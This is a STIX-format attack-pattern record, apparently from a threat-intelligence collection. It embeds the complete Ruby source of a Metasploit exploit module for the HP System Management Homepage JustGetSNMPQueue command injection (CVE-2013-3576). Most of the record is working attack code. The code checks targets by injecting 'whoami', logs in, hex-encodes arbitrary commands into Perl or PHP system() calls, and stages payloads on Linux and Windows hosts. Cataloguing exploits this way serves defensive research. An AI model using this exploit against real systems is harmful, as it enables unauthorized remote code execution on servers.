{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3de92339-cb56-4b86-87f9-661822b454da",
    "created": "2024-08-14T17:10:03.307453Z",
    "modified": "2024-08-14T17:10:03.307457Z",
    "name": "\"HP System Management Homepage JustGetSNMPQueue Command Injection\"",
    "description": " This module exploits a vulnerability found in HP System Management Homepage.  By supplying a specially crafted HTTP request, it is possible to control the 'tempfilename' variable in function JustGetSNMPQueue (found in ginkgosnmp.inc) which will be used in a exec() function.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/hp_sys_mgmt_exec.rb",
            "external_id": "hp_sys_mgmt_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3576"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP System Management Homepage JustGetSNMPQueue Command Injection\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in HP System Management Homepage.  By\n        supplying a specially crafted HTTP request, it is possible to control the\n        'tempfilename' variable in function JustGetSNMPQueue (found in ginkgosnmp.inc),\n        which will be used in a exec() function.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Markus Wulftange',  # Discovery & multi-platform Metasploit module\n          'sinn3r'             # initial Windows Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2013-3576'],\n          ['OSVDB', '94191'],\n          ['US-CERT-VU', '735364']\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'Platform'       => %w{ linux win },\n      'Targets'        =>\n        [\n          ['Linux', {\n            'Platform' => 'linux',\n            'Arch' => ARCH_X86,\n            'CmdStagerFlavor' => 'bourne'\n          }],\n          ['Linux (x64)', {\n            'Platform' => 'linux',\n            'Arch' => ARCH_X64,\n            'CmdStagerFlavor' => 'bourne'\n          }],\n          ['Windows', {\n            'Platform' => 'win',\n            'Arch' => ARCH_X86,\n            'CmdStagerFlavor' => 'vbs'\n          }],\n          ['Windows (x64)', {\n            'Platform' => 'win',\n            'Arch' => ARCH_X64,\n            'CmdStagerFlavor' => 'vbs'\n          }],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-06-11'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(2381),\n        # USERNAME/PASS may not be necessary, because the anonymous access is possible\n        OptString.new(\"USERNAME\", [false, 'The username to authenticate as']),\n        OptString.new(\"PASSWORD\", [false, 'The password to authenticate with'])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    @cookie = ''\n\n    sig = Rex::Text.rand_text_alpha(10)\n    cmd = \"echo #{sig}&&whoami&&echo #{sig}\"\n\n    res = send_command(cmd)\n    if not res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.code == 200 && res.body =~ /#{sig}/\n      vprint_good(\"Running with user '#{res.body.split(sig)[1].strip}'\")\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  def login\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n\n    cookie = ''\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => '/proxy/ssllogin',\n      'vars_post' => {\n        'redirecturl'         => '',\n        'redirectquerystring' => '',\n        'user'                => username,\n        'password'            => password\n      }\n    })\n\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Connection timed out during login\")\n    end\n\n    # CpqElm-Login: success\n    if res.headers['CpqElm-Login'].to_s =~ /success/\n      cookie = res.get_cookies.scan(/(Compaq\\-HMMD=[\\w\\-]+)/).flatten[0] || ''\n    end\n\n    cookie\n  end\n\n\n  def setup_stager\n    execute_cmdstager(:temp => './', :linemax => 2800)\n  end\n\n\n  def execute_command(cmd, opts={})\n    # Encodes command as sequence of hex values to be passed to the Perl/PHP\n    # function `pack(\"N*\", ...)` that is then used in a `system(...)` call.\n\n    # trailing bytes need to be handled separately\n    rem = cmd.size % 4\n    if rem != 0\n      last_bytes = \".chr(#{cmd[-rem..-1].each_byte.map(&:ord).join(\").chr(\")})\"\n      cmd = cmd[0...-rem]\n    end\n\n    # convert double words into hex representation\n    dwords = cmd.each_byte.each_slice(4).map { |dw|\n      sprintf(\"0x%x\", dw.pack(\"C*\").unpack(\"N\")[0])\n    }\n\n    # build final Perl/PHP code that is getting executed\n    script_code = \"system(pack(chr(78).chr(42),#{dwords.join(\",\")})#{last_bytes});\"\n\n    # build Perl/PHP invocation command\n    case target.opts['Platform']\n    # Perl for Linux as it's more likely to be in the PATH\n    when \"linux\" then cmd = \"perl -e '#{script_code}'\"\n    # PHP for Windows\n    when \"win\"   then cmd = \"php -r #{script_code}\"\n    end\n\n    res = send_command(cmd)\n    if res && res.code != 200\n      vprint_error(\"Unexpected response:\\n#{res}\")\n      fail_with(Failure::Unknown, \"There was an unexpected response\")\n    end\n  end\n\n\n  def send_command(cmd)\n    if !datastore['USERNAME'].to_s.empty? && !datastore['PASSWORD'].to_s.empty? && @cookie.empty?\n      @cookie = login\n      if @cookie.empty?\n        fail_with(Failure::NoAccess, \"#{peer} - Login failed\")\n      else\n        print_good(\"Logged in as '#{datastore['USERNAME']}'\")\n      end\n    end\n\n    req_opts = {}\n    req_opts['uri'] = generate_uri(cmd)\n    unless @cookie.empty?\n      browser_chk = 'HPSMH-browser-check=done for this session'\n      curl_loc    = \"curlocation-#{datastore['USERNAME']}=\"\n      req_opts['cookie'] = \"#{@cookie}; #{browser_chk}; #{curl_loc}\"\n    end\n\n    send_request_raw(req_opts)\n  end\n\n\n  def generate_uri(cmd)\n    \"#{normalize_uri(\"smhutil\",\"snmpchp/\")}&#{cmd.gsub(/ /, \"%20\")}&&echo\"\n  end\n\n\n  def exploit\n    @cookie = ''\n\n    setup_stager\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-06-11",
    "x_mitre_platforms": [
        "win'"
    ]
}